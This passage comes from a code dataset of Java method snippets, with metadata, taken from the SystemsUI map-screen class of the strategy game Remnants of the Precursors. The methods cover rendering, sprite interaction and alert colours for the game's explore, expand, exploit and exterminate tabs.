brownEdgeC };\n\n        Color grayEdgeC = new Color(59,59,59);\n        Color grayMidC = new Color(92,92,92);\n        Color[] grayColors = {grayEdgeC, grayMidC, grayEdgeC };\n\n        Color greenEdgeC = new Color(44,59,30);\n        Color greenMidC = new Color(71,93,48);\n        Color[] greenColors = {greenEdgeC, greenMidC, greenEdgeC };\n\n        Color redEdgeC = new Color(92,20,20);\n        Color redMidC = new Color(117,42,42);\n        Color[] redColors = {redEdgeC, redMidC, redEdgeC };\n\n        brownBackC = new LinearGradientPaint(start, end, dist, brownColors);\n        grayBackC = new LinearGradientPaint(start, end, dist, grayColors);\n        greenBackC = new LinearGradientPaint(start, end, dist, greenColors);\n        redBackC = new LinearGradientPaint(start, end, dist, redColors);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55123, "method_name": "paint", "class_name": "SystemsUI", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void paint(Graphics g) {\n        checkMapInitialized();\n        super.paint(g);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55124, "method_name": "paintOverMap", "class_name": "SystemsUI", "params": ["GalaxyMapPanel", "Graphics2D"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void paintOverMap(GalaxyMapPanel ui, Graphics2D g) {\n        int w = ui.getWidth();\n        int h = ui.getHeight();\n                           \n        if (backGradient == null) {\n            Color c0 = Color.black;\n            Color c1 = new Color(71,53,39);\n            Point2D start = new Point2D.Float(s10, h-scaled(200));\n            Point2D end = new Point2D.Float(s10, h-s20);\n            float[] dist = {0.0f, 0.7f, 1.0f};\n            Color[] colors = {c0, c0, c1 };\n            backGradient = new LinearGradientPaint(start, end, dist, colors);\n        }\n        g.setPaint(backGradient);\n        Area a = new Area(new Rectangle(0,0,w,h));\n        a.subtract(new Area(new Rectangle(s10, s40,w-scaled(295), h-s70)));\n        g.fill(a);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55125, "method_name": "shadeC", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Color", "snippet": "    public Color shadeC()                          { return rallyBackLoC; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55126, "method_name": "backC", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Color", "snippet": "    public Color backC()                           { return rallyBackHiC; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55127, "method_name": "lightC", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Color", "snippet": "    public Color lightC()                          { return rallyBorderC; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55128, "method_name": "drawMemory", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean drawMemory()            { return true; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55129, "method_name": "flagColor", "class_name": "SystemsUI", "params": ["StarSystem"], "throws": null, "modifiers": ["public"], "return_type": "Color", "snippet": "    public Color flagColor(StarSystem s)             { return s.notes().isEmpty() ? null : Color.yellow; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55130, "method_name": "map", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GalaxyMapPanel", "snippet": "    public GalaxyMapPanel map()         { return map; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55131, "method_name": "initModel", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initModel() {\n        int w = scaled(Rotp.IMG_W);\n        int h = scaled(Rotp.IMG_H);\n        int rightPaneW = scaled(250);\n\n        setBackground(Color.black);\n        Border emptyBorder = newEmptyBorder(0,pad,pad,pad);\n        setBorder(emptyBorder);\n\n        map = new GalaxyMapPanel(this);\n        map.setBorder(null);\n        map.setBounds(0,0,w,h);\n\n        titlePanel = new MainTitlePanel(\"SYSTEMS_TITLE\");\n        titlePanel.setBounds(0,0,w-rightPaneW-s25, s45);\n        \n        displayPanel = new SystemInfoPanel(this);\n        \n        BasePanel rightPanel = new BasePanel();\n        rightPanel.setBounds(w-rightPaneW-s25,0,rightPaneW,h-s20);\n        rightPanel.setOpaque(false);\n        rightPanel.setLayout(new BorderLayout(0, pad));\n        rightPanel.add(displayPanel, BorderLayout.CENTER);\n        rightPanel.add(new ExitFleetsButton(w, s60, s10, s2), BorderLayout.SOUTH);\n        \n        setLayout(new BorderLayout());\n        add(layers, BorderLayout.CENTER);\n        \n        layers.add(titlePanel, new Integer(3));\n        layers.add(rightPanel,new Integer(2));\n        layers.add(map, new Integer(0));\n        Border line1 = newLineBorder(newColor(60,60,60),2);\n        Border line2 = newLineBorder(newColor(0,0,0),8);\n        Border compound1 = BorderFactory.createCompoundBorder(line2, line1);\n        setBorder(compound1);\n        setOpaque(false);\n\n        addMouseWheelListener(this);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55132, "method_name": "animating", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean animating()    { return animate; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55133, "method_name": "clearMapSelections", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearMapSelections() {\n        targetSystem = null;\n        hoverSystem = null;\n        List<FlightPathSprite> paths = FlightPathSprite.workingPaths();\n        paths.clear();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55134, "method_name": "checkMapInitialized", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void checkMapInitialized() {\n        Boolean inited = (Boolean) sessionVar(\"SYSTEMSUI_MAP_INITIALIZED\");\n        if ((inited == null) || (inited == false)) {\n            // init appropriate scale and bounds\n            //map.toggleFlightPathDisplay(false);\n            sessionVar(\"SYSTEMSUI_MAP_INITIALIZED\", true);\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55135, "method_name": "alertColor", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["public"], "return_type": "Color", "snippet": "    public Color alertColor(SystemView sv) { \n        switch(selectedTab) {\n            case exploreTab:     return exploreAlertColor(sv);\n            case expandTab:      return expandAlertColor(sv);\n            case exploitTab:     return exploitAlertColor(sv);\n            case exterminateTab: return exterminateAlertColor(sv);\n        }\n        return null; \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55136, "method_name": "lastSystemSelected", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "StarSystem", "snippet": "    public StarSystem lastSystemSelected()    { return (StarSystem) sessionVar(\"MAINUI_SELECTED_SYSTEM\"); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55137, "method_name": "lastSystemSelected", "class_name": "SystemsUI", "params": ["Sprite"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void lastSystemSelected(Sprite s)  { sessionVar(\"MAINUI_SELECTED_SYSTEM\", s); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55138, "method_name": "systemToDisplay", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "StarSystem", "snippet": "    public StarSystem systemToDisplay() {\n        Sprite spr = hoveringSprite();\n        if (spr instanceof StarSystem)\n            return (StarSystem) spr;\n        else\n            return lastSystemSelected();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55139, "method_name": "canChangeMapScales", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean canChangeMapScales()                 { return true; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55140, "method_name": "clickingNull", "class_name": "SystemsUI", "params": ["int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clickingNull(int cnt, boolean right) {\n        displayPanel.useNullClick(cnt, right);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55141, "method_name": "clickingOnSprite", "class_name": "SystemsUI", "params": ["Sprite", "int", "boolean", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clickingOnSprite(Sprite o, int count, boolean rightClick, boolean click) {\n        if ((o instanceof ShipFleet) || (o instanceof Transport) || (o instanceof FlightPathSprite))\n            return;\n        \n        boolean used = (displayPanel != null) && displayPanel.useClickedSprite(o, count, rightClick);\n        hoveringOverSprite(null);\n        if (!used)  {\n            o.click(map, count, rightClick, click);\n            if (o.persistOnClick()) {\n                hoveringSprite(null);\n                clickedSprite(o);\n            }\n            o.repaint(map);\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55142, "method_name": "hoveringOverSprite", "class_name": "SystemsUI", "params": ["Sprite"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void hoveringOverSprite(Sprite o) {\n        if (o == lastHoveringSprite())\n            return;\n\n        \n        if (lastHoveringSprite() != null)\n            lastHoveringSprite().mouseExit(map);\n\n        if ((o == null) || (o instanceof StarSystem) || (o instanceof MapControlSprite))\n            lastHoveringSprite(o);\n        else\n            return;\n        \n        boolean used = (displayPanel != null) && displayPanel.useHoveringSprite(o);\n        if (!used) {\n            if (hoveringSprite() != null)\n                hoveringSprite().mouseExit(map);\n            hoveringSprite(o);\n            if (hoveringSprite() != null)\n                hoveringSprite().mouseEnter(map);\n        }\n        repaint();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55143, "method_name": "shouldDrawSprite", "class_name": "SystemsUI", "params": ["Sprite"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean shouldDrawSprite(Sprite s) {\n        if (s == null)\n            return false;\n        if (s instanceof FlightPathSprite) {\n            FlightPathSprite fp = (FlightPathSprite) s;\n            Sprite fpShip = (Sprite) fp.ship();\n            if (isClicked(fpShip) || isHovering(fpShip))\n                return true;\n            if (isClicked((Sprite) fp.destination()))\n                return true;\n            if (FlightPathSprite.workingPaths().contains(fp))\n                return true;\n            if (map.showAllFlightPaths())\n                return true;\n            if (map.showImportantFlightPaths())\n                return fp.isPlayer() || fp.aggressiveToPlayer();\n            return false;\n        }      \n        return true;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55144, "method_name": "mapFocus", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Location", "snippet": "    public Location mapFocus() {\n        Location loc = (Location) sessionVar(\"MAINUI_MAP_FOCUS\");\n        if (loc == null) {\n            loc = new Location();\n            sessionVar(\"MAINUI_MAP_FOCUS\", loc);\n        }\n        return loc;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55145, "method_name": "clickedSprite", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Sprite", "snippet": "    public Sprite clickedSprite()            { return (Sprite) sessionVar(\"MAINUI_CLICKED_SPRITE\"); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55146, "method_name": "clickedSprite", "class_name": "SystemsUI", "params": ["Sprite"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clickedSprite(Sprite s)      { \n        sessionVar(\"MAINUI_CLICKED_SPRITE\", s); \n        if (s instanceof StarSystem)\n            lastSystemSelected(s);\n\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55147, "method_name": "hoveringSprite", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Sprite", "snippet": "    public Sprite hoveringSprite()           { return (Sprite) sessionVar(\"MAINUI_HOVERING_SPRITE\"); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55148, "method_name": "hoveringSprite", "class_name": "SystemsUI", "params": ["Sprite"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void hoveringSprite(Sprite s)     { sessionVar(\"MAINUI_HOVERING_SPRITE\", s); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55149, "method_name": "lastHoveringSprite", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Sprite", "snippet": "    public Sprite lastHoveringSprite()       { return (Sprite) sessionVar(\"MAINUI_LAST_HOVERING_SPRITE\"); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55150, "method_name": "lastHoveringSprite", "class_name": "SystemsUI", "params": ["Sprite"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void lastHoveringSprite(Sprite s) { sessionVar(\"MAINUI_LAST_HOVERING_SPRITE\", s); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55151, "method_name": "controlSprites", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Sprite>", "snippet": "    public List<Sprite> controlSprites()      { return controls; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55152, "method_name": "mapBorder", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Border", "snippet": "    public Border mapBorder()       { return null; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55153, "method_name": "startingScalePct", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float startingScalePct() {\n        return (player().maxY()-player().minY()) / map().sizeY();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55154, "method_name": "animate", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void animate() {\n        if (animate)\n            map.animate();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55155, "method_name": "randomEventStatus", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String randomEventStatus(SystemView sv) {\n        if (!sv.scouted())\n            return \"\";\n        StarSystem sys = sv.system();\n        if (sys.hasEvent()) {\n            RandomEvent ev = galaxy().events().activeEventForKey(sys.eventKey());\n            if (ev != null)\n                return ev.statusMessage();\n        }\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55156, "method_name": "exploreAlertColor", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["private"], "return_type": "Color", "snippet": "    private Color exploreAlertColor(SystemView sv) { \n        String eventMessage = randomEventStatus(sv);\n        if (!eventMessage.isEmpty()) {\n            if (sv.empire() == player())\n                return MainUI.redAlertC;\n            else\n                return MainUI.yellowAlertC;\n        }\n        \n        if (sv.scouted())\n            return null;\n        \n        if (sv.isGuarded()) \n            return MainUI.redAlertC;\n        \n        float sysDistance = sv.distance();\n        Empire pl = player();\n        if (sysDistance <= pl.scoutRange()) {\n            if (!sv.isColonized() || pl.alliedWith(sv.empId()))\n                return MainUI.greenAlertC;\n            else if (pl.atWarWith(sv.empId()))\n                return MainUI.redAlertC;\n            else\n                return MainUI.yellowAlertC;\n        }\n        \n        String neededTechId = pl.rangeTechNeededToScout(sv.sysId);\n        if (neededTechId != null) \n            return MainUI.yellowAlertC;\n        \n        return null; \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55157, "method_name": "expandAlertColor", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["private"], "return_type": "Color", "snippet": "    private Color expandAlertColor(SystemView sv) { \n        if (!sv.scouted())\n            return null;   \n                \n        String eventMessage = randomEventStatus(sv);\n        if (!eventMessage.isEmpty()) {\n            if (sv.empire() == player())\n                return MainUI.redAlertC;\n        }\n\n        if (sv.isColonized()) \n            return null;\n        \n        float sysDistance = sv.distance();\n        Empire pl = player();\n        if ((sysDistance <= pl.shipRange()) && pl.canColonize(sv.sysId)) \n            return MainUI.greenAlertC;\n        \n        String rangeTech = pl.rangeTechNeededToReach(sv.sysId);\n        String envTech = pl.environmentTechNeededToColonize(sv.sysId);   \n        if ((rangeTech != null) && (envTech != null))\n            return MainUI.yellowAlertC;\n        if ((envTech != null) && (sysDistance <= pl.shipRange()))\n            return MainUI.yellowAlertC;\n        if ((rangeTech != null) && pl.canColonize(sv.sysId)) \n            return MainUI.yellowAlertC;\n        return null; \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55158, "method_name": "exploitAlertColor", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["private"], "return_type": "Color", "snippet": "    private Color exploitAlertColor(SystemView sv) { \n        if (sv.empire() != player())\n            return null;\n        \n        String eventMessage = randomEventStatus(sv);\n        if (!eventMessage.isEmpty()) {\n            if (sv.empire() == player())\n                return MainUI.redAlertC;\n        }\n        \n        Colony col = sv.system().colony();\n        \n        if (col.inRebellion())\n            return MainUI.redAlertC;\n        \n        if (col.creatingWaste()) \n            return MainUI.redAlertC;\n        \n        int pct = (int) (100*col.currentProductionCapacity());\n        if (pct < 34)\n            return MainUI.redAlertC;\n        else if (pct < 67)\n            return MainUI.yellowAlertC;\n        else if (pct < 100)\n            return MainUI.greenAlertC;\n        return null; \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55159, "method_name": "exterminateAlertColor", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["private"], "return_type": "Color", "snippet": "    private Color exterminateAlertColor(SystemView sv)       { \n        Empire pl = player();\n        if (sv.distance() > pl.scoutRange())\n            return null;\n        \n        // show enemy colonies as yellow\n        Empire sysEmp = sv.empire();\n        int sysEmpId = sv.empId();\n        if (pl.atWarWith(sysEmpId))\n            return MainUI.yellowAlertC;\n        \n        // deal with enemy fleets orbiting systems around us\n        List<ShipFleet> fleets = sv.orbitingFleets();\n        for (ShipFleet fl: fleets) {\n            if (fl.isPotentiallyArmed(pl)) {\n                if (pl.atWarWith(fl.empId())) { \n                    if (sysEmp == null)\n                        return MainUI.yellowAlertC; // enemy fleets around empty systems          \n                    if (sysEmp.isPlayer())\n                        return MainUI.redAlertC;    // enemy fleets around player colonies\n                    else if (pl.alliedWith(sysEmpId))\n                        return MainUI.yellowAlertC; // enemy fleets around ally systems \n                    else\n                        return MainUI.yellowAlertC; // enemy fleets around other systems \n                }  \n            }\n        }\n        \n        // if we can see ship ETAs, look for armed enemy ships approaching\n        // player or allied colonies\n        if (pl.knowShipETA() && pl.alliedWith(sysEmpId)) {\n            for (Ship sh: pl.visibleShips()) {\n                if ((sh.destSysId() == sv.sysId) && pl.atWarWith(sh.empId()) && sh.isPotentiallyArmed(pl)) {\n                    if (sysEmp.isPlayer())\n                        return MainUI.redAlertC; // enemy fleets approaching player colonies\n                    else \n                        return MainUI.yellowAlertC; // enemy fleets approaching player allied colonies\n                }\n            }            \n        }\n        // for player systems, highlight those with no bases or insufficient shields\n        if (sysEmp == null)\n            return null;\n        if (!sysEmp.isPlayer())\n            return null;\n\n        if (!sv.colony().defense().isCompleted())\n            return MainUI.greenAlertC;\n        \n        return null; \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55160, "method_name": "alertDescription", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String alertDescription(SystemView sv) { \n        switch(selectedTab) {\n            case exploreTab:     return exploreAlertDescription(sv);\n            case expandTab:      return expandAlertDescription(sv);\n            case exploitTab:     return exploitAlertDescription(sv);\n            case exterminateTab: return exterminateAlertDescription(sv);\n        }\n        return null; \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55161, "method_name": "exploreAlertDescription", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String exploreAlertDescription(SystemView sv) { \n        String eventMessage = randomEventStatus(sv);\n        if (!eventMessage.isEmpty()) \n             return eventMessage; \n        \n        if (sv.scouted())\n            return null;      \n        if (sv.isGuarded()) \n            return text(\"SYSTEMS_UNSCOUTED_GUARDED\");\n        \n        float sysDistance = sv.distance();\n        Empire pl = player();\n        if (sysDistance <= pl.scoutRange()) {\n            if (!sv.isColonized() || pl.alliedWith(sv.empId()))\n                return text(\"SYSTEMS_UNSCOUTED\");\n            else if (pl.atWarWith(sv.empId()))\n                return text(\"SYSTEMS_UNSCOUTED_ENEMY\");\n            else\n                return text(\"SYSTEMS_UNSCOUTED_COLONIZED\");\n        }\n        \n        String neededTechId = pl.rangeTechNeededToScout(sv.sysId);\n        if (neededTechId != null) {\n            Tech t = tech(neededTechId);\n            return text(\"SYSTEMS_UNSCOUTED_NEED_TECH\", t.name());\n        }     \n        return text(\"SYSTEMS_UNSCOUTED_UNREACHABLE\"); \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55162, "method_name": "expandAlertDescription", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String expandAlertDescription(SystemView sv) { \n        if (!sv.scouted())\n            return null;      \n        String eventMessage = randomEventStatus(sv);\n        if (!eventMessage.isEmpty()) {\n             if (sv.empire() == player())\n                 return eventMessage;\n        }\n\n        if (sv.isColonized()) \n            return null;\n        \n        float sysDistance = sv.distance();\n        Empire pl = player();\n        if ((sysDistance <= pl.shipRange()) && pl.canColonize(sv.sysId)) \n            return text(\"SYSTEMS_CAN_COLONIZE\");\n        \n        String rangeTech = pl.rangeTechNeededToReach(sv.sysId);\n        String envTech = pl.environmentTechNeededToColonize(sv.sysId);  \n        \n        if ((rangeTech != null) && (envTech != null)) {\n            Tech t1 = tech(envTech);\n            Tech t2 = tech(rangeTech);\n            return text(\"SYSTEMS_UNCOLONIZED_NEED_TECHS\", t1.name(), t2.name());\n        }\n        if ((envTech != null) && (sysDistance <= pl.shipRange())){\n            Tech t1 = tech(envTech);\n            return text(\"SYSTEMS_UNCOLONIZED_NEED_TECH\", t1.name());            \n        }\n        if ((rangeTech != null) && pl.canColonize(sv.sysId)) {\n            Tech t1 = tech(rangeTech);\n            return 